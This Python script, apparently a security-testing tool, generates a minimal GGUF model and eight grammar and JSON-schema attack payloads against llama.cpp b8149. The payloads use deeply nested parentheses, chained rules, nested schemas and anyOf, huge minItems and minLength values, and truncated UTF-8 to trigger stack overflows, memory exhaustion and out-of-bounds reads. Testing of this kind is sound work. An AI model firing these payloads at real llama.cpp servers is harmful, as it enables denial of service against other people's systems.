#!/usr/bin/env python3
"""
Generate grammar/JSON-schema attack payloads for llama.cpp b8149.
Also generates a minimal valid GGUF model for testing.
"""

import struct
import os
import sys
import json

# ─── GGUF constants ───
GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

# GGUF value types
GGUF_TYPE_UINT32 = 4
GGUF_TYPE_STRING = 8
GGUF_TYPE_UINT64 = 10
GGUF_TYPE_FLOAT32 = 6

# GGML types
GGML_TYPE_F32 = 0


def write_string(f, s):
    b = s.encode("utf-8")
    f.write(struct.pack("<Q", len(b)))
    f.write(b)


def write_kv(f, key, vtype, val):
    write_string(f, key)
    f.write(struct.pack("<I", vtype))
    if vtype == GGUF_TYPE_STRING:
        write_string(f, val)
    elif vtype == GGUF_TYPE_UINT32:
        f.write(struct.pack("<I", val))
    elif vtype == GGUF_TYPE_UINT64:
        f.write(struct.pack("<Q", val))
    elif vtype == GGUF_TYPE_FLOAT32:
        f.write(struct.pack("<f", val))


def write_tensor_info(f, name, n_dims, shape, dtype):
    write_string(f, name)
    f.write(struct.pack("<I", n_dims))
    for d in shape:
        f.write(struct.pack("<Q", d))
    f.write(struct.pack("<I", dtype))
    f.write(struct.pack("<Q", 0))  # offset


def create_minimal_gguf(path):
    """Create a minimal GGUF that llama.cpp will load far enough to reach grammar parsing.
    This model won't do real inference but should pass initial header/metadata validation."""

    # Minimal llama arch params
    vocab_size = 32
    embedding_dim = 16
    n_layers = 1
    n_heads = 1
    ff_dim = 32

    metadata = [
        ("general.architecture", GGUF_TYPE_STRING, "llama"),
        ("general.name", GGUF_TYPE_STRING, "test-minimal"),
        ("llama.context_length", GGUF_TYPE_UINT32, 128),
        ("llama.embedding_length", GGUF_TYPE_UINT32, embedding_dim),
        ("llama.block_count", GGUF_TYPE_UINT32, n_layers),
        ("llama.attention.head_count", GGUF_TYPE_UINT32, n_heads),
        ("llama.attention.head_count_kv", GGUF_TYPE_UINT32, n_heads),
        ("llama.feed_forward_length", GGUF_TYPE_UINT32, ff_dim),
        ("llama.rope.freq_base", GGUF_TYPE_FLOAT32, 10000.0),
        ("llama.attention.layer_norm_rms_epsilon", GGUF_TYPE_FLOAT32, 1e-5),
        ("general.file_type", GGUF_TYPE_UINT32, 0),  # F32
        # Tokenizer
        ("tokenizer.ggml.model", GGUF_TYPE_STRING, "llama"),
    ]

    # Define minimal tensors needed for llama arch
    tensors = [
        ("token_embd.weight", 2, [embedding_dim, vocab_size], GGML_TYPE_F32),
        ("output_norm.weight", 1, [embedding_dim], GGML_TYPE_F32),
        ("output.weight", 2, [embedding_dim, vocab_size], GGML_TYPE_F32),
        # Layer 0
        ("blk.0.attn_norm.weight", 1, [embedding_dim], GGML_TYPE_F32),
        ("blk.0.attn_q.weight", 2, [embedding_dim, embedding_dim], GGML_TYPE_F32),
        ("blk.0.attn_k.weight", 2, [embedding_dim, embedding_dim], GGML_TYPE_F32),
        ("blk.0.attn_v.weight", 2, [embedding_dim, embedding_dim], GGML_TYPE_F32),
        ("blk.0.attn_output.weight", 2, [embedding_dim, embedding_dim], GGML_TYPE_F32),
        ("blk.0.ffn_norm.weight", 1, [embedding_dim], GGML_TYPE_F32),
        ("blk.0.ffn_gate.weight", 2, [embedding_dim, ff_dim], GGML_TYPE_F32),
        ("blk.0.ffn_up.weight", 2, [embedding_dim, ff_dim], GGML_TYPE_F32),
        ("blk.0.ffn_down.weight", 2, [ff_dim, embedding_dim], GGML_TYPE_F32),
    ]

    # Compute tensor data sizes and offsets
    ALIGNMENT = 32
    tensor_data_parts = []
    for tname, ndims, shape, dtype in tensors:
        n_elements = 1
        for d in shape:
            n_elements *= d
        # F32 = 4 bytes per element
        size = n_elements * 4
        tensor_data_parts.append(b"\x00" * size)

    with open(path, "wb") as f:
        # Header
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", len(tensors)))
        f.write(struct.pack("<Q", len(metadata)))

        # Metadata KV pairs
        for key, vtype, val in metadata:
            write_kv(f, key, vtype, val)

        # Tensor info (with correct offsets)
        offset = 0
        for i, (tname, ndims, shape, dtype) in enumerate(tensors):
            write_string(f, tname)
            f.write(struct.pack("<I", ndims))
            for d in shape:
                f.write(struct.pack("<Q", d))
            f.write(struct.pack("<I", dtype))
            f.write(struct.pack("<Q", offset))

            n_elements = 1
            for d in shape:
                n_elements *= d
            size = n_elements * 4
            # Align offset
            offset += size
            if offset % ALIGNMENT != 0:
                offset += ALIGNMENT - (offset % ALIGNMENT)

        # Pad to alignment before tensor data
        pos = f.tell()
        if pos % ALIGNMENT != 0:
            f.write(b"\x00" * (ALIGNMENT - (pos % ALIGNMENT)))

        # Tensor data
        for i, data in enumerate(tensor_data_parts):
            f.write(data)
            pos = f.tell()
            if pos % ALIGNMENT != 0:
                f.write(b"\x00" * (ALIGNMENT - (pos % ALIGNMENT)))

    print(f"  Created minimal GGUF: {path} ({os.path.getsize(path)} bytes)")


def create_grammar_tests(outdir):
    os.makedirs(outdir, exist_ok=True)

    # ─── Test 1: Deeply nested parentheses → stack overflow in parse_alternates ───
    print("  Test 1: Deeply nested parentheses (parse_alternates stack overflow)")
    depth = 50000
    grammar = 'root ::= ' + '(' * depth + '"a"' + ')' * depth
    with open(os.path.join(outdir, "test_nested_parens.gbnf"), "w") as f:
        f.write(grammar)

    # ─── Test 2: Deeply chained rules → stack overflow in advance_stack ───
    print("  Test 2: Deeply chained rule references (advance_stack recursion)")
    n_rules = 20000
    lines = []
    lines.append(f"root ::= rule0")
    for i in range(n_rules - 1):
        lines.append(f"rule{i} ::= rule{i+1}")
    lines.append(f"rule{n_rules-1} ::= \"x\"")
    grammar = "\n".join(lines)
    with open(os.path.join(outdir, "test_chained_rules.gbnf"), "w") as f:
        f.write(grammar)

    # ─── Test 3: Repetition near threshold → memory amplification ───
    print("  Test 3: Repetition near MAX_REPETITION_THRESHOLD")
    grammar = 'root ::= [a-z]{1999,2000}'
    with open(os.path.join(outdir, "test_max_repetition.gbnf"), "w") as f:
        f.write(grammar)

    # ─── Test 4: Deeply nested JSON schema → stack overflow in visit() ───
    print("  Test 4: Deeply nested JSON schema (visit() stack overflow)")
    # Build JSON string iteratively to avoid Python recursion limit
    depth = 5000
    inner = '{"type":"integer"}'
    for _ in range(depth):
        inner = '{"type":"object","properties":{"x":' + inner + '},"required":["x"]}'
    with open(os.path.join(outdir, "test_nested_schema.json"), "w") as f:
        f.write(inner)

    # ─── Test 5: JSON schema with huge minItems → OOM in build_repetition ───
    print("  Test 5: JSON schema huge minItems (build_repetition OOM)")
    schema = {
        "type": "array",
        "items": {"type": "string"},
        "minItems": 1000000,
        "maxItems": 1000000
    }
    with open(os.path.join(outdir, "test_huge_minitems.json"), "w") as f:
        json.dump(schema, f)

    # ─── Test 6: JSON schema deeply nested anyOf → visit() recursion ───
    print("  Test 6: Deeply nested anyOf schema")
    # Build iteratively to avoid Python recursion limit
    inner = '{"type":"string"}'
    for _ in range(5000):
        inner = '{"anyOf":[' + inner + ',{"type":"integer"}]}'
    with open(os.path.join(outdir, "test_nested_anyof.json"), "w") as f:
        f.write(inner)

    # ─── Test 7: Truncated UTF-8 in grammar → potential OOB read ───
    print("  Test 7: Truncated UTF-8 in grammar (decode_utf8 OOB)")
    # 0xE0 is start of 3-byte UTF-8 sequence, followed by end of string
    grammar = b'root ::= "\xe0"'
    with open(os.path.join(outdir, "test_truncated_utf8.gbnf"), "wb") as f:
        f.write(grammar)

    # ─── Test 8: JSON schema with huge minLength ───
    print("  Test 8: JSON schema huge minLength")
    schema = {
        "type": "string",
        "minLength": 2000000000
    }
    with open(os.path.join(outdir, "test_huge_minlength.json"), "w") as f:
        json.dump(schema, f)

    print(f"  Generated 8 test payloads in {outdir}")


if __name__ == "__main__":
    outdir = sys.argv[1] if len(sys.argv) > 1 else "grammar_tests"
    print("Creating minimal GGUF model...")
    os.makedirs(outdir, exist_ok=True)
    create_minimal_gguf(os.path.join(outdir, "minimal.gguf"))
    print("")
    print("Creating grammar/schema test payloads...")
    create_grammar_tests(outdir)
